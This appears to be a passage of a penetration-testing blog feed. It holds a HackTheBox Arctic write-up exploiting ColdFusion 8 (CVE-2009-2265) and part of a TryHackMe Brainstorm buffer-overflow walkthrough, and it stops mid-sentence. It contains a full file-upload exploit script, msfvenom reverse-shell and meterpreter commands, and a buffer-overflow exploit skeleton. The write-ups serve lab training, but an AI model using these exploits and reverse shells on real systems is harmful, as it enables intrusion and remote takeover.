/root/htb/machines/Windows/Arctic/50057.pyThe exploit is essentially doing three things: It generates a JSP (JavaServer Pages) reverse shell file with msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp Afterward, it sends it via an arbitrary file upload vulnerability in FCKeditor (CVE-2009-2265) at this URL: http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;amp;Type=File&amp;amp;CurrentFolder=/{filename}.jsp%00 Then, it executes this JSP malicious file by opening the following URL: http://{rhost}:{rport}/userfiles/file/{filename}.jspWe just have to edit these information:Finally, we can execute the exploit, wait a little and we have a shell as tolis:$ python3 50057.pyUser (tolis)C:\\ColdFusion8\\runtime\\bin&amp;gt;cd C:\\Users\\tolisC:\\Users\\tolis&amp;gt;cd DesktopC:\\Users\\tolis\\Desktop&amp;gt;dir Volume in drive C has no label. Volume Serial Number is F88F-4EA5 Directory of C:\\Users\\tolis\\Desktop22/03/2017 10:00 &amp;lt;DIR&amp;gt; .22/03/2017 10:00 &amp;lt;DIR&amp;gt; ..22/03/2017 10:01 32 user.txt 1 File(s) 32 bytes 2 Dir(s) 33.183.985.664 bytes freeC:\\Users\\tolis\\Desktop&amp;gt;type user.txt02650d3a69a70780c302e146a6cb96f3C:\\Users\\tolis\\Desktop&amp;gt;systeminfoHost Name: ARCTICOS Name: Microsoft Windows Server 2008 R2 Standard OS Version: 6.1.7600 N/A Build 7600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 55041-507-9857321-84451Original Install Date: 22/3/2017, 11:09:45 System Boot Time: 15/8/2021, 1:39:13 System Manufacturer: VMware, Inc.System Model: VMware Virtual PlatformSystem Type: x64-based PCProcessor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 MhzBIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: el;GreekInput Locale: en-us;English (United States)Time Zone: (UTC+02:00) Athens, Bucharest, IstanbulTotal Physical Memory: 1.023 MBAvailable Physical Memory: 200 MBVirtual Memory: Max Size: 2.047 MBVirtual Memory: Available: 1.234 MBVirtual Memory: In Use: 813 MBPage File Location(s): C:\\pagefile.sysDomain: HTBLogon Server: N/AHotfix(s): N/ANetwork Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.11PrivescShell to MeterpreterI wanted to upgrade my shell so I used msfvenom and mutli/handler from Metasploit:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(vpnip) LPORT=8500 -f exe &amp;gt; meterpreter.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesFile transferIn order to transfer the file meterpreter.exe I tried many techniques such as running an SMB server or using PowerShell but each time I failed. Then I modified the exploit script to post and upload meterpreter.exe:# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)# Google Dork: intext:&quot;adobe coldfusion 8&quot;# Date: 24/06/2021# Exploit Author: Pergyz# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html# Version: 8# Tested on: Microsoft Windows Server 2008 R2 Standard# CVE : CVE-2009-2265#!/usr/bin/python3from multiprocessing import Processimport ioimport mimetypesimport osimport urllib.requestimport uuidclass MultiPartForm: def __init__(self): self.files = [] self.boundary = uuid.uuid4().hex.encode(&#39;utf-8&#39;) return def get_content_type(self): return &#39;multipart/form-data; boundary={}&#39;.format(self.boundary.decode(&#39;utf-8&#39;)) def add_file(self, fieldname, filename, fileHandle, mimetype=None): body = fileHandle.read() if mimetype is None: mimetype = (mimetypes.guess_type(filename)[0] or &#39;application/octet-stream&#39;) self.files.append((fieldname, filename, mimetype, body)) return @staticmethod def _attached_file(name, filename): return (f&#39;Content-Disposition: form-data; name=&quot;{name}&quot;; filename=&quot;{filename}&quot;\\r\\n&#39;).encode(&#39;utf-8&#39;) @staticmethod def _content_type(ct): return &#39;Content-Type: {}\\r\\n&#39;.format(ct).encode(&#39;utf-8&#39;) def __bytes__(self): buffer = io.BytesIO() boundary = b&#39;--&#39; + self.boundary + b&#39;\\r\\n&#39; for f_name, filename, f_content_type, body in self.files: buffer.write(boundary) buffer.write(self._attached_file(f_name, filename)) buffer.write(self._content_type(f_content_type)) buffer.write(b&#39;\\r\\n&#39;) buffer.write(body) buffer.write(b&#39;\\r\\n&#39;) buffer.write(b&#39;--&#39; + self.boundary + b&#39;--\\r\\n&#39;) return buffer.getvalue()def execute_payload(): print(&#39;\\nExecuting the payload...&#39;) print(urllib.request.urlopen(f&#39;http://{rhost}:{rport}/userfiles/file/{filename}.jsp&#39;).read().decode(&#39;utf-8&#39;))if __name__ == &#39;__main__&#39;: # Define some information lhost = &#39;10.10.14.12&#39; lport = 4444 rhost = &quot;10.10.10.11&quot; rport = 8500 filename = &quot;meterpreter&quot; # uuid.uuid4().hex # Encode the form data form = MultiPartForm() form.add_file(&#39;newfile&#39;, filename + &#39;.txt&#39;, fileHandle=open(filename + &#39;.exe&#39;, &#39;rb&#39;)) data = bytes(form) # Create a request request = urllib.request.Request(f&#39;http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;amp;Type=File&amp;amp;CurrentFolder=/{filename}.exe%00&#39;, data=data) request.add_header(&#39;Content-type&#39;, form.get_content_type()) request.add_header(&#39;Content-length&#39;, len(data)) # Send the request and print the response print(&#39;\\nSending request and printing response...&#39;) print(urllib.request.urlopen(request).read().decode(&#39;utf-8&#39;)) # Print some information print(&#39;\\nPrinting some information for debugging...&#39;) print(f&#39;lhost: {lhost}&#39;) print(f&#39;rhost: {rhost}&#39;) print(f&#39;rport: {rport}&#39;) print(f&#39;payload: {filename}.exe&#39;)I looked for the file and it was located in C:\\ColdFusion8\\wwwroot\\userfiles\\file\\. I executed it and got a meterpreter session:.YES!local_exploit_suggesterFirst, let’s take a look at sysinfo:Okay so we need to migrate to another process because we want to switch to a x64 version of meterpreter:meterpreter &amp;gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 12 480 spoolsv.exe 236 4 smss.exe 276 480 svchost.exe 328 308 csrss.exe 372 308 wininit.exe 388 380 csrss.exe 412 1176 cmd.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\cmd.exe 436 380 winlogon.exe 480 372 services.exe 496 372 lsass.exe 504 372 lsm.exe 604 480 svchost.exe 680 480 svchost.exe 756 436 LogonUI.exe 764 480 svchost.exe 808 480 svchost.exe 864 480 svchost.exe 904 480 svchost.exe 944 480 svchost.exe 1040 480 CF8DotNetsvc.exe 1060 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exe 1084 1040 JNBDotNetSide.exe 1100 328 conhost.exe 1124 4028 met_shell.exe x86 0 ARCTIC\\tolis C:\\ColdFusion8\\wwwroot\\userfiles\\file\\met_shell.exe 1148 480 jrunsvc.exe x64 0 ARCTIC\\tolis C:\\ColdFusion8\\runtime\\bin\\jrunsvc.exe 1176 1148 jrun.exe x64 0 ARCTIC\\tolis C:\\ColdFusion8\\runtime\\bin\\jrun.exe 1184 480 swagent.exe 1192 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exe 1196 1176 cmd.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\cmd.exe 1228 480 swstrtr.exe 1236 1228 swsoc.exe 1244 328 conhost.exe 1312 480 k2admin.exe 1456 480 svchost.exe 1492 480 VGAuthService.exe 1752 480 vmtoolsd.exe 1776 480 ManagementAgentHost.exe 1996 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exe 2036 604 WmiPrvSE.exe 2128 480 dllhost.exe 2240 1312 k2server.exe 2248 328 conhost.exe 2352 1124 powershell.exe x86 0 ARCTIC\\tolis C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe 2444 1312 k2index.exe 2460 328 conhost.exe 2896 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exe 2964 480 svchost.exe 3092 412 powershell.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 3144 480 msdtc.exe 3404 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exe 3548 1124 powershell.exe x86 0 ARCTIC\\tolis C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe 3776 480 sppsvc.exe 3880 1176 cmd.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\cmd.exe 3912 1196 powershell.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 3920 328 conhost.exe x64 0 ARCTIC\\tolis C:\\Windows\\System32\\conhost.exemeterpreter &amp;gt; migrate 3920[*] Migrating from 1124 to 3920...[*] Migration completed successfully.Let’s check sysinfo again:We’re good! Hit Ctrl+Z to background the session and use post/multi/recon/local_exploit_suggester.We can use exploit/windows/local/ms10_092_schelevator to escalate and get SYSTEM:Useful links SecWiki - windows-kernel-exploits WindowsExploits by abatchy Microsoft Security Bulletin MS10-092 - Important Vulnerability in Task Scheduler Could Allow Elevation of Privilege" }, { "title": "TryHackMe - Brainstorm", "url": "/thm-brainstorm/", "categories": "TryHackMe walkthroughs, Windows", "tags": "ftp binary download, PE32, buffer overflow, pwn, msf-pattern_create, msf-pattern_offset, x64dbg, ERC.Xdbg, jmp esp, fuzzing, msfvenom, shellcode, thm-windows, writeup, oscp-prep", "date": "2021-08-11 00:55:11 +0700", "snippet": "Brainstorm is a TryHackMe room that consists in reversing a chat program and exploiting a buffer overflow on a remote Windows machine.Enumeration$ nmap -Pn -oN ports.txt 10.10.70.196PORT STATE SERVICE21/tcp open ftp3389/tcp open ms-wbt-server9999/tcp open abyssFTP (port 21)We can login anonymously with ftp. As we can see there is a folder called chatserver which contains two files: chatserver.exe essfunc.dllAt this point, I downloaded the two files using put &amp;lt;filename&amp;gt;. Then I tried to run chatserver.exe with wine but it didn’t worked. I also tried to execute it from a Windows VM.It’s only after watching the first 3 minutes from this video that I discovered that the files were corrupted, and there is an alternative way to download them:In the screenshot below, we can see that the files downloaded with put and the files downloaded with prompt OFF; binary; mget * do not have the same MD5 hash:Afterward, I was able to run the .exe from a Windows 10 virtual machine.chatserver.exe (port 9999)There is a strange service on port 9999 which looks like a chat application.This strange port is some how related to the files we found.In the next part, we’ll see if there is a way to exploit that strange service and gain access to the target system.ExploitationI executed chatserver.exe on a local Windows virtual machine and attached it to x32dbg to find a potential buffer overflow. I wanted to use x64dbg / x32dbg for many reasons: @sebdraven recommended me this tool a few years ago to start reverse engineering, it’s open-source and maintained by a community, the tool also supports x64 debugging (unlike Immunity Debugger) and it doesn’t require a pro license (unlike WinDBG or IDA pro).For stack-based buffer overflow exploitation, we usually follow four main steps to identify and exploit the buffer overflow vulnerability: Fuzzing the application Controlling EIP (calculating the offset) Identifying Bad Characters Finding a Return Instruction (like JMP ESP or CALL ESP for instance) Jumping to Shellcode (if security mechanisms such as DEP are disabled)In order to perform all these steps, I use an exploit script skeleton:#!/usr/bin/python3import socketimport sysfrom struct import packTARGET = &quot;127.0.0.1&quot;PORT = 8888OFFSET = 1337 # /usr/bin/msf-pattern_offset -q VALUEdef send_payload(payload, debug=False): try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TARGET, PORT)) if debug: breakpoint() s.send(payload) s.close() except: print(&quot;Could not establish a connection&quot;) sys.exit(0)def fuzz(): for i in range(0, 10000, 500): # incrementing by 500 at each iteration buffer = b&quot;A&quot; * i print(&quot;Fuzzing %s bytes&quot; % i) send_payload(buffer, debug=True)def eip_offset(): # /usr/bin/msf-pattern_create -l VALUE pattern = bytes(&quot;&quot;, &quot;utf-8&quot;) send_payload(pattern)def eip_control(): buffer = b&quot;A&quot; * OFFSET eip = b&quot;B&quot; * 4 payload = buffer + eip send_payload(payload)def bad_chars(): all_chars = bytes([ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF ]) buffer = b&quot;A&quot; * OFFSET eip = b&quot;B&quot; * 4 payload = buffer + eip + all_chars send_payload(payload)def exploit(): # msfvenom -p &#39;windows/shell_reverse_tcp&#39; LHOST=OUR_IP LPORT=OUR_LISTENING_PORT EXITFUNC=thread -f &#39;python&#39; --bad-chars &quot;\\x00&quot; --var-name shellcode shellcode = b&quot;&quot; buffer = b&quot;A&quot; * OFFSET eip = pack(&quot;&amp;lt;L&quot;, 0x0069D2E5) # jmp_esp nop = b&quot;\\x90&quot; * 32 payload = buffer + eip + nop + shellcode send_payload(payload)#fuzz()#eip_offset()#eip_control()#bad_chars()#exploit()I will try to exploit this program locally and then run my exploit script directly on the target machine.FuzzingFirst, we will send a bunch of A’s to any input the program accepts to see whether or not we can cause the application to crash.#!/usr/bin/python3import socketimport sysTARGET = &quot;192.168.1.81&quot;PORT = 9999def send_payload(payload, debug=False): try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TARGET, PORT)) data = s.recv(1024) print(data.decode()) s.send(b&quot;h4x0r&quot;) # &#39;Please enter your username (max 20 characters):&#39; data = s.recv(1024) print(data.decode()) if debug: breakpoint() s.send(payload) # &#39;Write a message: &#39; s.close() except: print(&quot;Could not establish a connection&quot;) sys.exit(0)def fuzz(): for i in range(0, 10000, 500): # incrementing by 500 at each iteration buffer = b&quot;A&quot; * i print(&quot;Fuzzing %s bytes&quot; % i) send_payload(buffer, debug=False)fuzz()My script stopped after sending 3000 bytes:We can inspect the registers from x32dbg and indeed, EIP is filled with 41414141 (the hexadecimal representation for string ‘AAAA’) Tip: go to Options&amp;gt;Preferences&amp;gt;Events, and un-tick everything under Break on. By doing so, the program will only break when we crash it on an overflow.Controlling EIP (calculating the offset)During this step, we need to determine the offset which corresponds to the exact amount we need to reach EIP in order to crash the program.With pattern_create and pattern_offset, we can create a unique, non-repeating pattern of characters which will facilitate us the calculation of the offset.pattern_createFirst, we generate a pattern of 3000 characters:/usr/bin/msf-pattern_create -l 3000Then we send it to the target’s program:def eip_offset(): # /usr/bin/msf-pattern_create -l 3000 pattern = bytes(&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;,&quot;utf-8&quot;) send_payload(pattern) We can click on the restart button instead of closing the program and re-open it.We copy EIP’s value (31704330).pattern_offsetWe give this value to pattern_offset to get the exact offset:$ /usr/bin/msf-pattern_offset -q 31704330[*] Exact match at offset 2012We can send another socket to ensure that we control EIP by filling it with four B’s (0x42424242):OFFSET = 2012 # /usr/bin/msf-pattern_offset -q 31704330def eip_control(): buffer = b&quot;A&quot; * OFFSET eip = b&quot;B&quot; * 4 payload = buffer + eip send_payload(payload)And we successfully overwrote EIP’s value: Do not hesitate to close x32dbg and the program and re-open them.Identifying bad charactersWe need to identify the characters that we will not be able to use in our shellcode.To identify them, we have to send all characters after filling the EIP address and analyze the memory to see where our payload got truncated prematurely.def bad_chars(): all_chars = bytes([ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF ]) buffer = b&quot;A&quot; * OFFSET eip = b&quot;B&quot; * 4 payload = buffer + eip + all_charsAs you may noticed, I am starting with the 0x00 character excluded because this character is used as a string terminator in Assembly. If our input was starting with a null byte, the program may stop processing our payload, thinking it has reached the end of it.To analyze our payload in the program’s memory within x32dbg, we could rely only on our eyes by right-clicking on ESP and selecting Follow in Dump or Follow in Stack.We can also use a plugin called ERC.Xdbg to compare the dump with an array of bytes containing all characters. When I was doing Brainpan, I was using Immunity Debugger and [mona.py](http://mona.py). However mona.py does not support x64 and it relies on on Python2 which is no longer maintained. So I will be using ERC.Xdbg which is a great alternative as a plugin for x32dbg. The following command will set a default working directory to have all output files saved to:ERC --config SetWorkingDirectory C:\\Users\\user\\Desktop\\ The following command will generate an array with all characters into two files ByteArray_1.txt and ByteArray_1.bin:ERC --bytearray Finally, we can perform a byte by byte comparison of an area of memory and the bytes from the file we generated earlier:ERC --compare &amp;lt;ESP_ADDRESS&amp;gt; C:\\Users\\user\\Desktop\\ByteArray_1.binIt seems there are no bad characters (except 0x00 which was initially excluded from our payload)!Finding a return instructionOkay, so now we can subvert the program execution flow and have it execute any instruction we want by writing the instruction’s address to EIP.But how a single assembly instruction will help us 